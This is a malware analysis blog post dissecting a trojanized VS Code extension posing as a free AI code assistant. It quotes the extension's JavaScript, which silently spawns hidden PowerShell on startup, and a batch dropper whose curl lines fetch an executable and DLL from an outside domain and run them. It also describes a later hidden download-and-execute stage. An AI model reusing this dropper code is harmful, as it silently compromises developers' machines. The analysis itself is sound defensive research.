---
title: "Reverse engineering a trojanized VSCode extension"
date: 2026-03-09
categories: [Malware]
tags: [C, Reverse, Malware, WinAPI, Windows, VScode, BAT, JavaScript]
image: "https://i.pinimg.com/736x/90/e8/b8/90e8b888eeabb2340fa4aa1676054762.jpg"
---
## Introduction
Hello everyone! Since it’s been a long time since I last brought a malware analysis or reverse engineering post, I’ve decided to share a very interesting case today. I’ve been researching something to showcase here and found a campaign where the artifact poses as a VS Code AI assistance extension. On the surface, it promises to be a "free" code generation assistant, but package inspection reveals execution behavior that completely deviates from a legitimate plugin. It features hidden script activation and triggers during the editor's startup, alongside the remote delivery of executable binaries to temporary directories. It essentially acts as a dropper a basic initial compromise flow that transforms an IDE extension into a staging mechanism for second-stage malware. I hope you enjoy the analysis.

## VT results:
![alt image](/assets/vscode_darkgpt/vt.png)

## Analyzing the first-stage artifact
In the package.json file, its structure shows the use of activationEvents with onStartupFinished and *. This combination basically means that the extension will be activated for practically all VS Code sessions.
```json
  "publisher": "EffetMer",
  "main": "./extension.js",
  "extensionKind": ["ui", "workspace"],
  "activationEvents": [
    "onStartupFinished",
    "*"
  ],
```

### extension/extension.js 
In extension/extension.js, right at the beginning, suspicions are already raised regarding its execution flow:
```js
const { spawn } = require('child_process');
const fs = require('fs');
```

These two imports already define the extension's most sensitive capabilities: child_process allows for the execution of processes within the operating system, while fs enables reading and writing code to the disk. Together, these provide direct control over the victim's host.

```js
function log(msg) {
    const logPath = path.join(process.env.TEMP || 'C:\\Windows\\Temp', 'darkgpt.log');
    fs.appendFileSync(logPath, new Date().toISOString() + ' - ' + msg + '\n');
}
```
This function implements a logging mechanism within the system's Temp directory. This location is well known to those who deal with malware daily, as it indicates an attempt to avoid raising suspicion by using a path frequently accessed by many legitimate applications.

```js
function activate(context) {
    runScript(context);
}
```
Here, the activate function is called when the extension is loaded by VS Code, immediately triggering runScript. This confirms that no user interaction is required; the extension simply needs to be present on the system for the code to execute. Now, let’s dive into runScript:

```js
function runScript(context) {
    const markerPath = path.join(process.env.TEMP || 'C:\\Windows\\Temp', 'Lightshot', '.done');

    if (fs.existsSync(markerPath)) {
        return;
    }

    const scriptPath = context.asAbsolutePath('scripts/run.bat');

    if (!fs.existsSync(scriptPath)) {
        return;
    }

    const child = spawn('powershell.exe', [
        '-WindowStyle', 'Hidden',
        '-Command',
        `Start-Process -FilePath '${scriptPath.replace(/'/g, "''")}' -WindowStyle Hidden`
    ], {
        detached: true,
        stdio: 'ignore',
        windowsHide: true
    });

    child.unref();
}
```
First, it creates a control mechanism using a marker file (.done) inside the TEMP directory to prevent multiple executions—a typical behavior in loaders and droppers. The function also resolves the path to an external script that we will analyze later, called scripts/run.bat; this suggests that the main payload code is not contained within this specific file. It is also notable that execution occurs via PowerShell with -WindowStyle Hidden to ensure no terminal is displayed during the payload execution. Other options in the code further reinforce this silent execution, such as detached: true, stdio: 'ignore', and windowsHide: true. Finally, child.unref() is used to remove any link to the parent process.

## run.bat
```bat
@echo off
setlocal

set "DIR=%TEMP%\Lightshot"
set "EXE=%DIR%\Lightshot.exe"
set "DLL=%DIR%\Lightshot.dll"
set "DONE=%DIR%\.done"

if exist "%DONE%" exit /b 0

if not exist "%DIR%" mkdir "%DIR%"

@curl -s -L -o "%EXE%" "http://syn1112223334445556667778889990.org/Lightshot.exe" >nul 2>&1
@curl -s -L -o "%DLL%" "http://syn1112223334445556667778889990.org/Lightshot.dll" >nul 2>&1

if exist "%EXE%" (
    @start "" /min "%EXE%" >nul 2>&1
    @echo.>"%DONE%"
)

endlocal
```
In addition to setting up and creating the directory where the malicious files will be dropped, the most critical point in the entire script is the curl command:

```
@curl -s -L -o "%EXE%" "http://syn1112223334445556667778889990.org/Lightshot.exe" >nul 2>&1
@curl -s -L -o "%DLL%" "http://syn1112223334445556667778889990.org/Lightshot.dll" >nul 2>&1
```

By using curl, it downloads a DLL and an executable from an external domain. The use of -s (silent) and nul redirection eliminates any trace of output leakage, ensuring the download occurs silently and invisibly. This is undoubtedly where the second stage happens; however, when I went to retrieve these binaries, the operation had already concluded. Regardless, I managed to obtain the artifact from the VX-Underground project repository.

## Analyzing the Executable and the DLL
Something interesting occurs here, the Lightshot.exe binary appeared to be legitimate and signed. Its primary function was actually just to load the malicious DLL, which would then do the "dirty work" of dropping a third execution stage (to which I unfortunately do not have access yet). Let’s analyze and prove what I just described:

![alt image](/assets/vscode_darkgpt/funcao_carrega_dll.png)

### FUN_0041e0e0(int param_1)

Inside this binary function is where the main initialization responsible for locating and dynamically loading a DLL and resolving internal functions occurs. It basically prepares the environment to use Lightshot.dll at runtime. We can observe the following line in the code snippet:

```c
FUN_004073f0((int *)&local_14,&local_18,(uint *)L"\\Lightshot.dll");
```
This is where the construction of the full DLL path happens; it takes the base directory (local_18) and concatenates it with \\Lightshot.dll. As previously mentioned, the binary loads the DLL into memory:

```c
LoadLibraryW(local_14);
```
This is classic behavior in loaders, where the main binary does not execute the malicious payload itself but delegates that task to a DLL.

### Analyzing the DLL
![alt image](/assets/vscode_darkgpt/dll.png)

While analyzing the DLL, I found a function that represents an interesting stage in the execution flow, as this is where the DLL begins to perform an active action on the system. The central point of this function appears when it constructs a command string to be executed. This construction is handled by the function FUN_100020a0, but the final content is explicit: it boils down to assembling a PowerShell command with the -WindowStyle Hidden option which, as previously explained, hides terminal windows, reinforcing silent execution. The command uses Invoke-WebRequest, which is used to download a remote file from a specific domain. This file is saved in the temporary directory as runtime.exe. Unfortunately, I haven't been able to access this executable yet, but once I do, I will update this post with its analysis. Afterward, the PowerShell script immediately executes the binary using Start-Process. This chaining is known as Living-off-the-Land, where tools available on the target system itself, such as PowerShell, are leveraged.

The call to CreateProcessW is the moment this command actually comes to life. By passing the constructed string as an argument, the function creates a new process that executes PowerShell with all the parameters defined previously. The use of the CREATE_NO_WINDOW flag in conjunction with -WindowStyle Hidden ensures that this process runs completely out of the user's sight.

## Conclusion
Analyzing this case was very interesting, and we have the final verdict: never trust extensions, especially one with a name as strange as this one.